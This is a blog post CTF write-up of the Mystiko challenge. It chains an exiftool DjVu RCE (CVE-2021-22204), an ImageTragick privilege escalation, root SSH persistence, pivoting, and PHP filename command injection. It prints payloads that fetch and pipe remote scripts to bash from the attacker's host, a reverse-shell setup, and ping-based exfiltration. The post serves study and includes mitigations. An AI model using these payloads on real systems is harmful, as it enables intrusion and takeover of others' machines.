<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="MystikoCTF Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Mystiko CTF Writeup by Freddie" /><meta property="og:description" content="Mystiko CTF Writeup by Freddie" /><link rel="canonical" href="/posts/mystiko-writeup/" /><meta property="og:url" content="/posts/mystiko-writeup/" /><meta property="og:site_name" content="Freddie" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-07T08:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="MystikoCTF Writeup" /><meta name="twitter:site" content="@freddie0x1" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Mystiko CTF Writeup by Freddie","url":"/posts/mystiko-writeup/","@type":"BlogPosting","headline":"MystikoCTF Writeup","dateModified":"2022-01-31T05:30:24+08:00","datePublished":"2021-12-07T08:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/mystiko-writeup/"},"@context":"https://schema.org"}</script><title>MystikoCTF Writeup | Freddie</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Freddie"><meta name="application-name" content="Freddie"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/freddie.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Freddie</a></div><div class="site-subtitle font-italic">Freddie hacks, sometimes</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/freddie0x1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://github.com/Fr3dd1e" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['freddiehacks','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>MystikoCTF Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>MystikoCTF Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Freddie </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Dec 7, 2021, 8:00 AM +0800" >Dec 7, 2021<i class="unloaded">2021-12-07T08:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 30, 2022, 9:30 PM +0000" >Jan 30<i class="unloaded">2022-01-31T05:30:24+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2941 words">16 min read</span></div></div><div class="post-content"><h1 id="mystiko-ctf-writeup">Mystiko CTF Writeup</h1><blockquote><div class="table-wrapper"><table><tbody><tr><td>by <strong>Freddie</strong><td><a href="https://fredd.ie/posts/mystiko-writeup"><img data-proofer-ignore data-src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Ffredd%2Eie%2Fposts%2Fmystiko-writeup&amp;title=Views" alt="Hits" /></a></table></div></blockquote><p><br /></p><p>This is the writeup for the main challenge I rooted in Mystiko CTF.</p><blockquote><p>Scoring for this CTF was slightly odd: <br /> Each flag was worth 100 points, and up to 400 points would be awarded for the writeup. As there were only 6 flags available (5 of which I scored), the writeups were a pretty crucial section, so I’ve spent a lot of time waffling and explaining <em>every</em> little step. <br /> Additionally, due to time restrictions in the competition this is barely checked for grammar/technical issues.</p><p>That being said, I’m still posting this one to hopefully inspire some people to realise if a skid like me can do this, then they can too.</p></blockquote><h2 id="pixel---initial-machine">Pixel - Initial Machine</h2><h3 id="initial-foothold">Initial Foothold</h3><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-1.png" alt="" /></p><p>As per usual, we start off the challenge with a basic <code class="language-plaintext highlighter-rouge">nmap</code> scan, to enumerate what open ports are on the machine.</p><p>There are only two services publicly available:</p><ul><li>SSH (22)<li>HTTP (8080)</ul><p>We can visit the HTTP server on port 8080, and start manually playing with the application in order to see what it actually does.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-2.png" alt="" /></p><p>It seems we can upload images, then play with some image filters and settings.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-3.png" alt="" /></p><p>My immediate conclusion was that this must be a file upload vulnerability, and that I could inject something into the filename and that’d be that.</p><p>With the wonderful ability of hindsight, I can tell you that no, not only is this further from the truth, there are also no hidden directories of files on the webserver.</p><p>6 hours and 2 million words fuzzed later (I would not recommend doing this on an actual penetration test), my previous self came to the same conclusion. <br /> <br /></p><p>It was only after a significant break, and a <em>little</em> time spent banging my head against a hard wall, I noticed something strange.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-4.png" alt="" /></p><p>When a file is uploaded, there is a hidden element in the source code.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code> 10.61 image/jpeg 25 kB 349x480 </code></div></div><p>In fact, this looked rather familiar:</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-5.png" alt="" /></p><p>Could it perhaps be data from the tool <code class="language-plaintext highlighter-rouge">exiftool</code>, and that number at the top was the exiftool version?!</p><p>With just one small Google search, we can discover that yes, there is an exiftool version named 10.61, and better still <strong><em>there’s a public exploit for it</em></strong></p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-6.png" alt="" /></p><p>https://github.com/se162xg/CVE-2021-22204</p><p>As the webserver returns very little feedback, we can locally install the exiftool version, then run the exploits against it.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-7.png" alt="" /></p><p>https://github.com/exiftool/exiftool/releases/tag/10.61</p><p>To do so, we must first create a docker instance, to isolate the exiftool version, and just make things easier to work with generally:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>docker run <span class="nt">-v</span> ~/Documents/THM/Mystiko/exif_exploit:/mnt/exploit <span class="nt">-it</span> debian bash </code></div></div><p>We can also create a shared volume, so that transferring malicious payloads between the docker image, and main host is easy.</p><p>The following script initializes the docker container, and installs the exploit and necessary tools.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>apt update apt <span class="nb">install </span>git <span class="nt">-y</span> apt <span class="nb">install </span>bc <span class="nt">-y</span> <span class="nb">cd</span> /mnt/exploit git clone https://github.com/se162xg/CVE-2021-22204.git <span class="nb">cd </span>CVE-2021-22204 <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/sudo//g'</span> craft_a_djvu_exploit.sh </code></div></div><p>The following script then installs the exploitable exiftool version.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nb">cd</span> /mnt apt <span class="nb">install </span>wget <span class="nt">-y</span> wget https://github.com/exiftool/exiftool/archive/refs/tags/10.61.tar.gz <span class="nb">tar </span>xzvf 10.61.tar.gz <span class="nb">cd </span>exiftool-10.61 perl Makefile.PL ./exiftool </code></div></div><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-8.png" alt="" /></p><p>We can give the exploit a test run by generating the basic image payload with the command <code class="language-plaintext highlighter-rouge">id</code>, then running exiftool against the generated image.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-9.png" alt="" /></p><p>It works!<br /> We have the local exploit running, now all that is needed is to run it remotely, should be easy right…<br /> <br /></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>bash craft_a_djvu_exploit.sh <span class="s2">"/usr/bin/wget http://10.2.76.47"</span> </code></div></div><p>However, when uploading the generated file from the above command, our HTTP server receives nothing.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-10.png" alt="" /><br /> <br /></p><p>We don’t know if the code is being executed properly, or if the requests are just being caught by a firewall, so let’s see if we can send ICMP (ping) packets through, as they’re less often restricted by firewalls (in boot2root machines, that is).</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>bash craft_a_djvu_exploit.sh <span class="s2">"ping -c 2 10.2.76.47"</span> </code></div></div><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-11.png" alt="" /></p><p>Our <code class="language-plaintext highlighter-rouge">tcpdump</code> picks up ICMP packets being sent from the server, so our code is being executed remotely!</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-12.png" alt="" /></p><p>After a lot of enumeration, and having no luck getting other payloads to work, I resort to a boolean enumeration method.</p><p>In bash <code class="language-plaintext highlighter-rouge">&amp;&amp;</code> operator will only execute the second command, if the first command completes.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>which curl <span class="o">&amp;&amp;</span> ping <span class="nt">-c</span> 2 10.2.76.47 </code></div></div><p>So if <code class="language-plaintext highlighter-rouge">curl</code> is installed, the machine will ping us. Using this method, we can slowly exfiltrate information about the system.</p><p>Due to some weird voodoo magic, echoing strings, writing to files and using special characters like <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;</code> breaks the command. <br /> This means we can’t echo base64 strings into files, which makes it significantly harder to transfer files.<br /> <br /></p><p>Fortunately, we still have access to the upload file functionality of the web application. <br /> If we can find the <code class="language-plaintext highlighter-rouge">uploads</code> directory, we can upload scripts to aid our remote code execution.</p><p>We could use our incredibly slow and inefficient method of blindly searching for the directory, or we could use some <em>slightly</em> cursed CTF tactics. <br /> <br /></p><p>You can take a guess which option I went with.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-13.png" alt="" /></p><p>On the challenge author’s github, there is a (now deleted) repository containing the password protected source code of the application.</p><p>Despite our best efforts cracking the password, we are unable to view the source.<br /> This doesn’t mean it is completely useless, however.</p><p>When we try to unzip the file we can see some very useful information:</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-14.png" alt="" /></p><p>This not only shows me it is a python web application running (most likely using flask), but also that the uploads are stored in /static/uploads.</p><p>As a Flask web application simply routes the directory locations, when you achieve remote code execution you simply end up in the root of the application - the same directory that contains the python server file (in this case: pixel.py).</p><p>To confirm that we are actually in the root of the application, we can run the following remotely:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nb">ls </span>pixel.py <span class="o">&amp;&amp;</span> ping <span class="nt">-c</span> 2 10.2.76.47 </code></div></div><p>Fortunately, we receive two ping packets confirming this.</p><p>However, due to some shenanigans in the cursed code execution, we cannot simply <code class="language-plaintext highlighter-rouge">cat static/uploads/[file]</code>, but instead have to change directories, then read the file.</p><p>Additionally, when trying to <code class="language-plaintext highlighter-rouge">cd</code> into <code class="language-plaintext highlighter-rouge">static/uploads</code>, it appears to not exist, but we <strong>can</strong> <code class="language-plaintext highlighter-rouge">cd</code> into <code class="language-plaintext highlighter-rouge">s*/uploads</code>.</p><p>Sometimes, it’s simply best to not ask questions as to why, and hope you don’t get hurt anymore.</p><p>I’ll let the timestamps talk for themselves on this one, really.<br /> <img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-15.png" alt="" /><br /> <img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-16.png" alt="" /><br /> <br /></p><p><em>Swiftly</em> moving on, we now have access to our uploaded files. <br /> This means we can uploads bash scripts to be executed, then run them remotely.</p><p>Using our elegant, efficient, and definitely not broken bash script <code class="language-plaintext highlighter-rouge">aios.sh</code>, we can quickly grab a reverse shell:</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-17.png" alt="" /></p><p>We can upload the <code class="language-plaintext highlighter-rouge">shell.jpg</code> file to the server, to store it in the uploads directory.</p><p>Then to call our reverse shell payload, we simply generate a new malicious image using:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>bash craft_a_djvu_exploit.sh <span class="s2">"cd s*/uploads &amp;&amp; bash shell.jpg"</span> </code></div></div><p>and upload the generated <code class="language-plaintext highlighter-rouge">delicate.jpg</code> payload to the web application…</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-18.png" alt="" /></p><p>Voila - we have a shell!</p><p>Let’s stabilise this shell using the following:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span> &lt;Ctrl + Z&gt; <span class="o">&gt;</span> <span class="nb">stty </span>raw <span class="nt">-echo</span> <span class="o">&gt;</span> <span class="nb">fg</span> &lt;ENTER&gt; &lt;ENTER&gt; <span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm </code></div></div><h3 id="privilege-escalation">Privilege Escalation</h3><p>One of the lowest hanging fruit is checking if the current user has any special abilities set in the sudoers file. We can do this using <code class="language-plaintext highlighter-rouge">sudo -l</code></p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-19.png" alt="" /></p><p>Luckily, the user not only has the ability to run <code class="language-plaintext highlighter-rouge">/usr/bin/pixel</code> as root, but also without a password!</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-20.png" alt="" /></p><p>When researching the <code class="language-plaintext highlighter-rouge">convert</code> program, we are taken to the ImageMagick suite of tools.</p><p>After a little more research, it appears the ImageMagick suite is vulnerable to an exploit aptly named ImageTragick.</p><p>Using the proof of concept found here: https://rhinosecuritylabs.com/research/imagemagick-exploit-remediation/, we can create our exploit.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>push graphic-context viewbox 0 0 640 480 fill <span class="s1">'url(https://example.com/image.jpg"| [command]")'</span> pop graphic-context </code></div></div><p>Once again, using the oh-so-useful AllinOneShell (aios.sh) script, we can create another reverse shell payload.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>push graphic-context viewbox 0 0 640 480 fill <span class="s1">'url(https://example.com/image.jpg"| wget -O - http://10.2.76.47:8000/shell.sh | bash")'</span> pop graphic-context </code></div></div><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-21.png" alt="" /></p><p>We get a root shell!</p><p>It’s now important to set up persistence so we don’t have to repeat the exploitation everytime we need a shell. <br /> <br /></p><h3 id="persistence">Persistence</h3><p><em>Note: please don’t use these persistence methods in a real life engagement.</em></p><p>When initially scanning the machine, we can see that the SSH service is running.<br /> We can gain root persistence easily using this service.</p><p>By default, root SSH login is disabled in the sshd configuration file (<code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code>), so we must first enable it.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-22.png" alt="" /></p><p>To put these changes into effect, we must restart the <code class="language-plaintext highlighter-rouge">ssh</code> service:</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-23.png" alt="" /></p><p>Nice, we can now login as root, so don’t have to worry about the god-awful webapp ever again.</p><h3 id="vulnerability-mitigations">Vulnerability Mitigations</h3><p>It’s important to know how to be able to mitigate the vulnerabilities you are exploiting.</p><p>Fortunately for the development team at Mystiko, it’s really not too hard to fix.</p><h4 id="foothold">Foothold</h4><p>The current version of exiftool at writing (12.36) is not vulnerable to CVE-2021-22204. This means by simply updating exiftool: <code class="language-plaintext highlighter-rouge">sudo apt install libimage-exiftool-perl</code>, the vulnerability would be patched. <br /> Another positive is that the file upload functionality has undergone <em>extensive</em> testing, to which it has stood up to completely. <br /> Beers should definitely be bought for the developers because of that one.</p><h4 id="privesc">Privesc</h4><p>Similarly, the vulnerability exploited in the privilege escalation phase can also be patched by simply updating the software.<br /> <code class="language-plaintext highlighter-rouge">/usr/bin/convert</code> is part of the ImageMagick suite of tools, so to fix:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>imagemagick </code></div></div><p>It is also worth considering why the user <code class="language-plaintext highlighter-rouge">pixel</code> needs access to run the <code class="language-plaintext highlighter-rouge">/usr/bin/pixel</code> program as root, and why they do not even need their own password to do so. <br /> <br /><br /> <br /></p><h2 id="pivoting">Pivoting</h2><p>Having access to SSH as root simplifies the pivoting process greatly.</p><p>We can start by downloading a static <code class="language-plaintext highlighter-rouge">nmap</code> binary from https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap.</p><p>We can then upload this binary to the machine using SCP, this will help us greatly.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-24.png" alt="" /></p><p>In the <code class="language-plaintext highlighter-rouge">ip</code> information, we can our internal IP is <code class="language-plaintext highlighter-rouge">172.19.0.4</code>.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-25.png" alt="" /></p><p>We could scan the subnet, looking for other active hosts with the command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>./nmap 172.19.0.1/16 <span class="nt">-T4</span> <span class="nt">-v</span> </code></div></div><p>However, the <code class="language-plaintext highlighter-rouge">/16</code> subnet is rather large for our purposes, with <strong>65534</strong> hosts.</p><p>To save time, we can take an educated guess, and assume that if our IP address is <code class="language-plaintext highlighter-rouge">172.19.0.4</code>, that there will be other machines at <code class="language-plaintext highlighter-rouge">172.19.0.3</code> and <code class="language-plaintext highlighter-rouge">172.19.0.2</code>.</p><p>Using our machine as our pivot point, we can use nmap to scan these two discovered hosts.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-26.png" alt="" /><br /> <img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-27.png" alt="" /></p><p><br /><br /> <br /></p><h2 id="dev01---internal-machine">Dev01 - Internal machine</h2><h3 id="initial-foothold-1">Initial Foothold</h3><p>For the first machine we scan, we can see the host name is <code class="language-plaintext highlighter-rouge">dev01.ctf_default</code>. This suggests that we should target this machine first, as it is the next challenge. <br /> <br /></p><p>The web server (port 80) running on <code class="language-plaintext highlighter-rouge">dev01</code> looks very interesting, so we need to employ a tactic called port forwarding to do so.</p><p>Fortunately for us, SSH is running, so we can use this to tunnel the webserver to our local IP address.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code>ssh <span class="nt">-L</span> 127.0.0.1:9001:172.19.0.3:80 root@10.10.167.211 </code></div></div><p>This means if we visit port <code class="language-plaintext highlighter-rouge">9000</code> on our localhost, we will be able to reach the internal webserver.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-28.png" alt="" /></p><p>Like most web applications, we can start by scanning for directories using tools such as <code class="language-plaintext highlighter-rouge">gobuster</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://127.0.0.1:9001 <span class="nt">-w</span> /opt/raft-small-words.txt <span class="o">[</span>...] /developer <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://127.0.0.1:9001/developer/] </code></div></div><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-29.png" alt="" /></p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-30.png" alt="" /></p><p>A couple of key bits of information stick out to me:<br /> -&gt; <code class="language-plaintext highlighter-rouge">repo</code> : A git repository?<br /> -&gt; <code class="language-plaintext highlighter-rouge">epicdev420</code> : A unique username we haven’t seen before</p><p>Using this information, we can try perform some basic osint, and discover https://github.com/epicdev420.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-31.png" alt="" /></p><p>Our lucky guess is confirmed by the repository name: <code class="language-plaintext highlighter-rouge">Mystikocon2021ishere</code>.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-32.png" alt="" /></p><p>We can pull this repository, then extract the <code class="language-plaintext highlighter-rouge">rar</code> file, to acquire the source code for <code class="language-plaintext highlighter-rouge">/developer</code>:</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-33.png" alt="" /></p><p>There is one file that stands out to me in particular: <code class="language-plaintext highlighter-rouge">filechecker.php</code>.</p><p>Within that one file, one line stands out even more:</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-34.png" alt="" /></p><p>The filename is not being parsed correctly, so this application may be vulnerable to command injection!</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-35.png" alt="" /></p><p>When we visit the page, it seems we have the option to upload a file. <br /> Let’s upload a file normally, then proxy the request through burpsuite.</p><p>We can send the request to the Repeater tab using <code class="language-plaintext highlighter-rouge">Ctrl + R</code>.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-36.png" alt="" /></p><p>To break out of the echo command, we must inject a payload such as follows:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nb">nice</span><span class="s1">'; command #'</span> </code></div></div><p>This would make the command passed to <code class="language-plaintext highlighter-rouge">shell_exec()</code> as follows:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nb">echo</span> <span class="s1">'nice'</span><span class="p">;</span> <span class="nb">command</span> <span class="c"># &gt;&gt; test.txt</span> </code></div></div><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-37.png" alt="" /></p><p>We can see this command injection works beautifully, if we inject the command <code class="language-plaintext highlighter-rouge">sleep 10</code> the server takes over 11 seconds to respond.</p><p>However, there’s one small caveat when trying to gain a reverse shell - the special character <code class="language-plaintext highlighter-rouge">/</code> would crash the application.</p><p>This was quite a pain, but like always, we Tried Harder™.</p><p>We could make a curl request to a listener set up on the first machine we compromised (Pixel) using the filename: <code class="language-plaintext highlighter-rouge">nice'; curl 172.19.0.4:8000 #</code></p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-38.png" alt="" /></p><p>By default, curl tries to return the <code class="language-plaintext highlighter-rouge">index.html</code> page. If we move our <code class="language-plaintext highlighter-rouge">shell.sh</code> file to <code class="language-plaintext highlighter-rouge">index.html</code>, when curl retrieves the root of the webserver (index.html), it will grab our shell.sh file.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-39.png" alt="" /></p><p>Then if we set up our reverse shell listener (on the compromised Pixel machine, to save us having to remote port forward), curl the webserver once more, then pipe it to bash instead:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><span class="nb">nice</span><span class="s1">'; curl 172.19.0.4:8000|bash # </span></code></div></div><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-40.png" alt="" /></p><p>It works!!</p><p>We’ve got a foothold on the second machine.</p><h3 id="lateral-movement">Lateral Movement</h3><p>When briefly enumerating the machine manually, we can see that there is one non-admin user: <code class="language-plaintext highlighter-rouge">pixel</code>.</p><p>This is odd, as there was also a user named <code class="language-plaintext highlighter-rouge">pixel</code> on the initial machine. After a little more manual enumeration, I wondered, “could they be the same user, with the same password?”.</p><p>This led me down the unfortunate rabbit hole of attempting to crack the bcrypt password of the <code class="language-plaintext highlighter-rouge">pixel</code> user on the first machine (from /etc/shadow). Unfortunately for me and my CPU, this was to no avail.</p><p>However, while searching on initial machine a little more, I did discover that the <code class="language-plaintext highlighter-rouge">/root/.bash_history</code> file was not linked to /dev/null like usual. This means any commands root previously ran were saved to this file.</p><p><img data-proofer-ignore data-src="/assets/images/mystiko/mystiko-41.png" alt="" /></p><p>At the very top of this file is one <em>very</em> interesting entry.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far 